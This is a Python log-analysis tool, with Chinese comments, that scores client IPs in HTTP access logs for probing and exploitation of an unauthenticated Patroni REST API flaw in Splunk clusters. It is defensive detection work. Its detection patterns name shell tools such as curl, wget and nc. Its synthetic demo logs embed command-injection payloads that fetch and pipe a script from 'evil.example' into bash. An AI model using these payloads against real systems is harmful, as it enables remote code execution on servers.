#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PatroniWatch · 针对 CVE-2026-76268 的 HTTP 日志检测小 Agent

背景：Splunk Enterprise 搜索头集群成员的 Patroni REST API 缺少身份认证
(CWE-306, CVE-2026-76268, CVSS 9.8, 披露于 2026-10-07, 公告 SVD-2026-1001)，
攻击者无需账号即可调用集群配置操作、篡改集群配置并在宿主机执行任意命令。
影响版本：10.4 分支 < 10.4.3、10.2 分支 < 10.2.7（10.0.x / 9.4.x 不受影响）。

本工具读取 Splunk / 反向代理的 HTTP 访问日志，按客户端 IP 聚合，
用 4 组启发式规则识别针对 Patroni REST API 的探测与利用行为，
输出按 IP 的 0-100 风险评分、命中规则说明与证据链。

纯 Python 标准库，无第三方依赖；--demo 自带合成日志，离线可跑。

用法：
    python patroniwatch.py --demo                 # 演示模式
    python patroniwatch.py --file access.log     # 分析日志文件
    tail -f access.log | python patroniwatch.py  # 管道输入
    python patroniwatch.py --demo --json out.json
"""

import argparse
import json
import random
import re
import sys
from collections import defaultdict
from datetime import datetime, timedelta
from urllib.parse import unquote

# ----------------------------------------------------------------------------
# 日志解析（Apache / Nginx Combined 格式，兼容 Common 格式）
# ----------------------------------------------------------------------------

LOG_RE = re.compile(
    r'^(?P<ip>\S+) \S+ \S+ \[(?P<time>[^\]]+)\] '
    r'"(?P<method>[A-Z]+) (?P<url>\S+)(?: \S+)?" '
    r'(?P<status>\d{3}) \S+( "(?P<referer>[^"]*)" "(?P<ua>[^"]*)")?$'
)

TIME_FMT = "%d/%b/%Y:%H:%M:%S %z"


def parse_line(line):
    """解析一行访问日志，失败返回 None。"""
    m = LOG_RE.match(line.strip())
    if not m:
        return None
    try:
        ts = datetime.strptime(m.group("time"), TIME_FMT)
    except ValueError:
        ts = None
    return {
        "ip": m.group("ip"),
        "ts": ts,
        "method": m.group("method"),
        "url": m.group("url"),
        "status": int(m.group("status")),
        "ua": (m.group("ua") or "").lower(),
        "raw": line.strip(),
    }


def decode_twice(s):
    """两轮 URL 解码（第二轮把 + 视为空格），应对简单编码绕过。"""
    s = unquote(unquote(s.replace("+", " ")))
    return s


# ----------------------------------------------------------------------------
# 检测规则
# ----------------------------------------------------------------------------

# Patroni / Splunk 集群配置类敏感端点（大小写不敏感）
SENSITIVE_PATHS = (
    "/patroni", "/cluster", "/config", "/switchover", "/failover",
    "/restart", "/reload", "/reinitialize", "/pause", "/resume",
    "/maintenance", "/sync", "/leader", "/primary", "/master",
    "/health", "/liveness", "/readiness", "/metrics",
)

# 只读类端点（探测价值高，但本身不改配置）
READ_ONLY_PATHS = ("/health", "/liveness", "/readiness", "/metrics", "/patroni", "/cluster")

MUTATING_METHODS = ("POST", "PUT", "PATCH", "DELETE")

# shell 命令特征（出现在 URL 或请求体位置时可疑）
SHELL_PATTERNS = (
    re.compile(r"[;|&`$]"),                                   # 分隔符 / 命令替换
    re.compile(r"\$\("),                                      # $()
    re.compile(r"\b(curl|wget|nc|ncat|bash|sh|dash|zsh|python|perl|ruby|php)\b", re.I),
    re.compile(r"\b(whoami|id|cat|chmod|chown|base64|/bin/|/etc/passwd)\b", re.I),
    re.compile(r"%0a|%0d|%3b|%7c", re.I),                     # 编码后的换行/分隔符
)

# 扫描器指纹（严格列表：专职扫描工具）
SCANNER_UAS = ("sqlmap", "nikto", "nmap", "masscan", "gobuster",
               "dirbuster", "feroxbuster", "whatweb", "acunetix", "nessus")
# 命令行工具 UA（curl/wget 也常被攻击脚本使用，单独出现只是弱信号）
CLI_TOOL_UAS = ("curl", "wget", "httpie", "python-requests", "go-http-client")

RULES = {
    "R1": {"name": "未认证配置变更", "weight": 40,
           "desc": "POST/PUT/DELETE 打向集群配置类 REST 端点（Patroni API 缺认证，CWE-306）"},
    "R2": {"name": "API 路径探测", "weight": 20,
           "desc": "短时间内探测多个敏感 API 路径（侦察行为）"},
    "R3": {"name": "命令注入特征", "weight": 35,
           "desc": "请求中出现 shell 命令特征（; | $() 反引号 curl/wget 等）"},
    "R4": {"name": "扫描器指纹", "weight": 10,
           "desc": "UA 为专职扫描器/命令行工具或缺失 UA"},
}

PROBE_WINDOW = timedelta(seconds=60)   # R2 滑动窗口
PROBE_MIN_PATHS = 5                   # 窗口内不同敏感路径数阈值


def is_sensitive(url):
    path = decode_twice(url).split("?", 1)[0].lower()
    return any(p in path for p in SENSITIVE_PATHS)


def hit_rules(req):
    """返回该请求命中的规则 id 集合（R2 需聚合后判定，不在此处）。"""
    hits = set()
    decoded = decode_twice(req["url"])
    path = decoded.split("?", 1)[0].lower()
    sensitive = any(p in path for p in SENSITIVE_PATHS)

    if req["method"] in MUTATING_METHODS and sensitive:
        hits.add("R1")
    if any(p.search(decoded) for p in SHELL_PATTERNS):
        hits.add("R3")
    ua = req["ua"]
    if (not ua or ua == "-"
            or any(s in ua for s in SCANNER_UAS)
            or any(s in ua for s in CLI_TOOL_UAS)):
        hits.add("R4")
    return hits


def detect(requests):
    """按 IP 聚合检测，返回 {ip: 分析结果}。"""
    by_ip = defaultdict(list)
    for r in requests:
        by_ip[r["ip"]].append(r)

    results = {}
    for ip, reqs in by_ip.items():
        reqs.sort(key=lambda r: r["ts"] or datetime.min.replace(tzinfo=None))
        per_rule_hits = defaultdict(int)
        evidence = defaultdict(list)
        r1_success = False

        sensitive_hits = []  # (ts, path) 用于 R2 滑动窗口

        for req in reqs:
            hits = hit_rules(req)
            for rid in hits:
                per_rule_hits[rid] += 1
                if len(evidence[rid]) < 3:
                    evidence[rid].append(req["raw"])
            if "R1" in hits and 200 <= req["status"] < 300:
                r1_success = True  # 配置变更疑似成功，额外加分

            decoded = decode_twice(req["url"])
            path = decoded.split("?", 1)[0].lower()
            if any(p in path for p in SENSITIVE_PATHS) and req["ts"]:
                sensitive_hits.append((req["ts"], path))

        # R2：滑动窗口内不同敏感路径数
        r2_hit = False
        sensitive_hits.sort()
        for i, (ts_i, _) in enumerate(sensitive_hits):
            distinct = {p for ts_j, p in sensitive_hits
                        if ts_i <= ts_j <= ts_i + PROBE_WINDOW}
            if len(distinct) >= PROBE_MIN_PATHS:
                r2_hit = True
                break
        if r2_hit:
            per_rule_hits["R2"] += 1
            paths_seen = sorted({p for _, p in sensitive_hits})
            evidence["R2"].append(
                f"60 秒窗口内探测 {len(paths_seen)} 个敏感 API 路径: "
                + ", ".join(paths_seen[:8]))

        score = sum(RULES[rid]["weight"] for rid in per_rule_hits)
        # 攻击类型多样性加成
        score += min(15, 5 * max(0, len(per_rule_hits) - 1))
        # 配置变更疑似成功加成
        if r1_success:
            score += 10
        score = min(100, score)

        level = "高危" if score >= 70 else ("可疑" if score >= 40 else "正常")
        results[ip] = {
            "score": score,
            "level": level,
            "rules": sorted(per_rule_hits),
            "rule_names": [RULES[r]["name"] for r in sorted(per_rule_hits)],
            "hits": dict(per_rule_hits),
            "evidence": dict(evidence),
            "total_requests": len(reqs),
            "r1_success": r1_success,
        }
    return results


# ----------------------------------------------------------------------------
# 演示模式：合成日志
# ----------------------------------------------------------------------------

BENIGN_PATHS = (
    "/servicesNS/admin/search/search/jobs",
    "/services/search/jobs",
    "/services/authentication/users",
    "/en-US/app/search/dashboard",
    "/static/@abc123/js/common.js",
)

BENIGN_UAS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
)


def _line(ip, ts, method, url, status, ua):
    t = ts.strftime("%d/%b/%Y:%H:%M:%S +0800")
    return (f'{ip} - - [{t}] "{method} {url} HTTP/1.1" '
            f'{status} 1234 "-" "{ua}"')


def gen_demo_logs(seed=42):
    """生成混合了正常流量与 3 类攻击的合成访问日志。"""
    rng = random.Random(seed)
    base = datetime(2026, 10, 13, 8, 0, 0)
    lines = []

    def emit(ip, dt, method, url, status, ua):
        lines.append(_line(ip, base + timedelta(seconds=dt),
                           method, url, status, ua))

    # --- 正常流量 ---
    for i in range(30):
        emit(f"10.0.0.{rng.randint(2, 50)}", i * 20,
             "GET", rng.choice(BENIGN_PATHS), 200, rng.choice(BENIGN_UAS))

    # --- 攻击者 A：侦察（大量 GET 探测敏感端点，curl UA）---
    paths = ["/patroni", "/cluster", "/config", "/switchover", "/failover",
             "/restart", "/health", "/metrics", "/leader"]
    for i, p in enumerate(paths):
        emit("203.0.113.7", 700 + i * 5, "GET", p,
             200 if i % 2 == 0 else 404, "curl/8.0.1")

    # --- 攻击者 B：直接利用（未认证 POST 配置变更 + 命令注入载荷）---
    emit("198.51.100.23", 760, "POST", "/patroni/config", 200, "curl/8.0.1")
    emit("198.51.100.23", 765, "PUT",
         "/patroni/switchover?cmd=$(curl%20http://evil.example/x.sh|bash)", 200,
         "curl/8.0.1")
    emit("198.51.100.23", 770, "POST",
         "/patroni/restart?arg=;wget%20http://evil.example/m", 200,
         "curl/8.0.1")
    emit("198.51.100.23", 775, "DELETE", "/patroni/pause", 200, "curl/8.0.1")

    # --- 攻击者 C：单次试探（低分）---
    emit("192.0.2.44", 800, "GET", "/patroni", 200,
         "Mozilla/5.0 (compatible; scanner)")

    return lines


# ----------------------------------------------------------------------------
# 报告
# ----------------------------------------------------------------------------

def print_report(results):
    ordered = sorted(results.items(),
                     key=lambda kv: kv[1]["score"], reverse=True)
    flagged = [(ip, r) for ip, r in ordered if r["level"] != "正常"]
    watch = [(ip, r) for ip, r in ordered
             if r["level"] == "正常" and r["rules"]]
    print(f"共解析 IP {len(results)} 个，"
          f"其中告警 {len(flagged)} 个、观察 {len(watch)} 个")
    print()
    if flagged:
        print(f'{"客户端IP":<16}{"评分":<6}{"等级":<6}{"命中规则"}')
        print("-" * 70)
        for ip, r in flagged:
            print(f"{ip:<16}{r['score']:<6}{r['level']:<6}"
                  f"{'、'.join(r['rule_names'])}")
        print()
    if watch:
        print("【观察】有命中但未达告警阈值：")
        for ip, r in watch:
            print(f"  {ip:<16}评分 {r['score']:<4}"
                  f"{'、'.join(r['rule_names'])}")
        print()
    for ip, r in flagged:
        print(f"[{ip}] 评分 {r['score']}（{r['level']}）"
              + ("，配置变更疑似成功 ⚠" if r["r1_success"] else ""))
        for rid in r["rules"]:
            info = RULES[rid]
            print(f"  - {rid} {info['name']}: {info['desc']}")
            for ev in r["evidence"].get(rid, []):
                print(f"      例: {ev[:120]}")
        print()


def main():
    ap = argparse.ArgumentParser(description="PatroniWatch: CVE-2026-76268 日志检测")
    ap.add_argument("--file", help="访问日志文件路径")
    ap.add_argument("--demo", action="store_true", help="演示模式：用合成日志")
    ap.add_argument("--json", dest="json_path", help="告警结果 JSON 输出路径")
    args = ap.parse_args()

    if args.demo:
        lines = gen_demo_logs()
    elif args.file:
        with open(args.file, encoding="utf-8", errors="replace") as f:
            lines = f.readlines()
    else:
        lines = sys.stdin.readlines()

    requests = [r for r in (parse_line(l) for l in lines) if r]
    print(f"共解析 {len(requests)} 条访问日志")
    results = detect(requests)
    print_report(results)

    if args.json_path:
        alerts = {ip: r for ip, r in results.items() if r["level"] != "正常"}
        with open(args.json_path, "w", encoding="utf-8") as f:
            json.dump(alerts, f, ensure_ascii=False, indent=2)
        print(f"告警已写入 {args.json_path}")


if __name__ == "__main__":
    main()
